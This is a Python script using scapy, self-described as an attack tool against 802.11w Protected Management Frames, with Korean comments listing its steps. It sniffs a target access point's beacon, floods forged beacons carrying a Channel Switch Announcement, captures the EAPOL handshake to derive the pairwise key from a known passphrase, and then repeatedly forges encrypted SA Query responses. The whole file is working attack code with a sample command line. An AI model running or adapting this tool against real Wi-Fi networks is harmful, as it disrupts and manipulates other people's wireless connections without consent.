import parse
import keygen
import decrypt
import sys
import os
import time
import binascii
from scapy.all import *

ALGO_OPEN_AUTH = 0  # OPN
SYSTEM_STR = "[\x1b[36m*\x1b[0m]"
WARN_STR = "[\x1b[31m!\x1b[0m]"
INFO_STR = "\x1b[33m-\x1b[0m"
conf.verb=0

csa_frame = None
action_frame = None
ssid = None
interface = None
passphrase = None
channel = None
sta_mac = None
ap_mac = None
transaction_id = None
PTK = None
#######################################################################################################
#                                       Description
#								Attack Tool 802.11w PMF
# python3 mijeong.py mon0 Legitap guest1234! 1 f8:e6:1a:01:6b:07
# arg0: interface, arg1: ssid, arg2: passphrase, arg3: channel, arg4: sta_mac	
#######################################################################################################
#               						  공격방식
# 									1. CSA Attack
# 									2. Capture EAPOL and Generate PTK
# 									3. Send CSA Again
# 									4. while True:
#       									capture SA_Request
#											generate SA_Response
#       									send SA_Response
#######################################################################################################

#######################################################################################################
#							CAPTURE SA REQUSET AND SEND SA RESPONSE

def channel_switch(interface, channel):
	print(WARN_STR+" Channel Switching : Ch."+str(channel))
	os.system('iwconfig ' + interface + ' channel ' + str(channel))

def stop_filter_SA_Request(packet):
	if packet.haslayer(Dot11CCMP):
		dot11 = packet.getlayer(Dot11)
		ccmp = packet.getlayer(Dot11CCMP)
		if dot11.addr1==sta_mac and dot11.addr2==ap_mac and dot11.subtype == 13 and len(ccmp.data) == 12:
			global transaction_id
			data = decrypt.dot11_decrypt(packet,PTK[32:48])
			data_hex = binascii.hexlify(data)
			if data_hex[:2]==b'08' and data_hex[2:4]==b'00':
				transaction_id=data[2:]
				print(f"TK: {PTK[32:48]}")
				hexdump(data)
				print(SYSTEM_STR+" SA REQUEST CAPUTRED!!!")
				return True
			else:
				return False

def capture_SA_Request():
	sniff(iface=interface, stop_filter = stop_filter_SA_Request, timeout=15)


def send_SA_Response():
	sendp(action_frame, iface=interface, count=6)
	print(f"\t{INFO_STR} SA RESPONSE SEND!!!")

def gen_SA_Response():
	global action_frame
	action_frame = RadioTap()/Dot11(type=0,subtype=13,addr1=ap_mac,addr2=sta_mac,addr3=ap_mac)
	action_frame = decrypt.dot11_encrypt(action_frame,PTK[32:48],transaction_id)
#######################################################################################################
#									  CAPTURE EAPOL

def capture_EAPOL():
	parser = parse.PARSER(sta_mac, ap_mac)
	sniff(iface=interface, stop_filter = parser.get_info, timeout=15)
	return parser


#######################################################################################################
#									   CSA ATTACK

def stop_filter_beacon(packet):
	if packet.haslayer(Dot11Beacon):
		elt = packet.getlayer(Dot11Elt)
		dot11 = packet.getlayer(Dot11)
		beacon = packet.getlayer(Dot11Beacon)
		if bytes(ssid,'utf-8') == elt.info:
			print("\t"+INFO_STR+" CAPTURED BEACON FRAME !!!")
			global ap_mac
			ap_mac = dot11.addr3
			make_beacon_csa(elt, dot11)
			return True
	return False

def make_beacon_csa(elt, dot11):
	dot11_beacon = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=dot11.addr3, addr3=dot11.addr3)
	beacon = Dot11Beacon(cap=0o411)
	frame = RadioTap()/dot11_beacon/beacon
	csa = Dot11Elt(ID=0x25,len=3,info=bytes([0,100,1]))
	flag = False

	while elt != None:
		if elt.ID > 37 and flag == False:
			flag = True
			frame = frame/csa
		information_element = Dot11Elt(ID=elt.ID, len=len(elt.info), info=elt.info)
		frame = frame/information_element
		elt = elt.payload.getlayer(Dot11Elt)
	global csa_frame
	csa_frame = frame
	
 
def send_CSA():
	channel_switch(interface, channel)
	print(SYSTEM_STR+" CAPTUREING BEACON FRAME !!!")
	sniff(iface=interface, stop_filter = stop_filter_beacon)
	sendp(csa_frame, iface=interface, count = 20)
	print(SYSTEM_STR+" CSA ATTACK DONE !!!")
 
#######################################################################################################
#									  GENERATE PTK

def generate_ptk(parser):    
	key_gen_obj = keygen.KEY_GENERATOR(parser, ssid, passphrase)
	pmk = key_gen_obj.gen_PMK()
	ptk = key_gen_obj.gen_PTK(pmk)
	mics = key_gen_obj.gen_mics(ptk, parser.data) 
	if key_gen_obj.verify_mics(mics, parser):
		return ptk
	else:
		return None

#######################################################################################################

if __name__ == '__main__':
	interface = sys.argv[1]
	ssid = sys.argv[2]
	passphrase = sys.argv[3]
	channel = sys.argv[4]
	sta_mac = sys.argv[5]
	
	while PTK == None:
		send_CSA()
		parser = capture_EAPOL()
		print(parser.satisfied)
		if not parser.all_satisfied():
			print(WARN_STR+" EAPOL CAPTURE FAIL, RESTART PROCESS!")
			continue
		print(SYSTEM_STR+" ALL EAPOL CAPTURED!!!")
		PTK = generate_ptk(parser)
	while True:
		try:
			send_CSA()
			capture_SA_Request()
			if transaction_id == None:
				continue
			else:
				while True:
					try:
						gen_SA_Response()
						send_SA_Response()
						capture_SA_Request()
					except KeyboardInterrupt:
						break
		except KeyboardInterrupt:
			break
	print(SYSTEM_STR+" MIJEONG ATTACK FINISHED")